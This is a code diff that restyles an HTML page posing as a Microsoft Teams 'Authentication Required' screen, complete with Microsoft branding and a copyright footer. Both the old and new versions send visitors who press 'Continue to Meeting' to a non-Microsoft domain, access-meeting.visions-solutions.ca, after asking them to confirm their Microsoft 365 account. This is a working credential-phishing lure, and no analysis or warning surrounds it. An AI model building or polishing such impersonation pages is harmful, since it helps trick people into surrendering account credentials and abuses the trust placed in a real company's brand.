@@ -1,121 +1,96 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Microsoft Teams | Authentication Required</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
-<style>
-    * { box-sizing: border-box; }
-    body {
-        margin: 0;
-        padding: 0;
-        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        background-color: #f3f2f1;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
-    .card {
-        background: #ffffff;
-        border-radius: 12px;
-        box-shadow: 0 10px 35px rgba(0,0,0,0.15);
-        width: 420px;
-        max-width: 90%;
-        padding: 35px 30px;
-        text-align: center;
-        position: relative;
-    }
-    .top-bar {
-        height: 6px;
-        background-color: #6264A7;
-        border-top-left-radius: 12px;
-        border-top-right-radius: 12px;
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-    }
-    .logo {
-        width: 60px;
-        margin-bottom: 20px;
-    }
-    h1 {
-        font-size: 22px;
-        font-weight: 600;
-        color: #323130;
-        margin-bottom: 15px;
-    }
-    p {
-        font-size: 14px;
-        color: #605E5C;
-        line-height: 1.6;
-        margin-bottom: 30px;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        gap: 6px;
-    }
-    .info-icon {
-        font-size: 14px;
-        color: #464775;
-    }
-    .button-primary {
-        background-color: #6264A7;
-        color: #ffffff;
-        font-size: 15px;
-        font-weight: 600;
-        padding: 12px 0;
-        width: 100%;
-        border: none;
-        border-radius: 6px;
-        cursor: pointer;
-        transition: background-color 0.2s ease, transform 0.1s ease;
-    }
-    .button-primary:hover {
-        background-color: #4b4d90;
-        transform: translateY(-1px);
-    }
-    .button-primary:focus {
-        outline: 2px solid #464775;
-        outline-offset: 2px;
-    }
-    .footer {
-        margin-top: 28px;
-        font-size: 12px;
-        color: #8A8886;
-        border-top: 1px solid #E1DFDD;
-        padding-top: 14px;
-    }
-    @media (max-width: 480px) {
-        .card { padding: 28px 20px; }
-        h1 { font-size: 20px; }
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Teams | Authentication Required</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f2f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            width: 420px;
+            padding: 40px 30px;
+            text-align: center;
+        }
+        .logo {
+            width: 60px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 22px;
+            font-weight: 600;
+            color: #323130;
+            margin-bottom: 15px;
+        }
+        p {
+            font-size: 14px;
+            color: #605E5C;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+        .button-primary {
+            background-color: #6264A7;
+            color: #ffffff;
+            font-size: 15px;
+            font-weight: 600;
+            padding: 12px 0;
+            width: 100%;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+        .button-primary:hover {
+            background-color: #4b4d90;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #8A8886;
+            border-top: 1px solid #E1DFDD;
+            padding-top: 15px;
+        }
+        @media (max-width: 480px) {
+            .container {
+                width: 90%;
+                padding: 30px 20px;
+            }
+            h1 { font-size: 20px; }
+        }
+    </style>
 </head>
 <body>
-<div class="card">
-    <div class="top-bar"></div>
+    <div class="container">
+        <!-- Teams-style Logo -->
+        <svg class="logo" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Microsoft Teams Logo">
+            <path d="M10 10H0V0H10V10ZM10 21H0V11H10V21ZM21 10H11V0H21V10ZM21 21H11V11H21V21Z" fill="#6264A7"/>
+        </svg>
 
-    <!-- Teams-style Logo -->
-    <svg class="logo" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Microsoft Teams Logo">
-        <path d="M10 10H0V0H10V10ZM10 21H0V11H10V21ZM21 10H11V0H21V10ZM21 21H11V11H21V21Z" fill="#6264A7"/>
-    </svg>
+        <h1>Authentication Required</h1>
+        <p>To continue to your Microsoft Teams meeting, please confirm your Microsoft 365 account. This is a standard security step to ensure secure access for all participants.</p>
 
-    <h1>Authentication Required</h1>
-    <p><span class="info-icon">ℹ️</span>To continue to your Microsoft Teams meeting, please complete the Microsoft 365 verification step. This ensures secure access for all participants.</p>
+        <button type="button" class="button-primary" title="Continue to Meeting" aria-label="Continue to Meeting" onclick="window.location.href='https://access-meeting.visions-solutions.ca/TlwlKaDO';">
+            Continue to Meeting
+        </button>
 
-    <button type="button" class="button-primary" title="Continue to Meeting" aria-label="Continue to Meeting" onclick="window.location.href='https://access-meeting.visions-solutions.ca/TlwlKaDO';">
-        Continue to Meeting
-    </button>
-
-    <div class="footer">
-        © 2025 Microsoft Corporation. All rights reserved.
+        <div class="footer">
+            © 2025 Microsoft Corporation. All rights reserved.
+        </div>
     </div>
-</div>
 </body>
 </html>
-
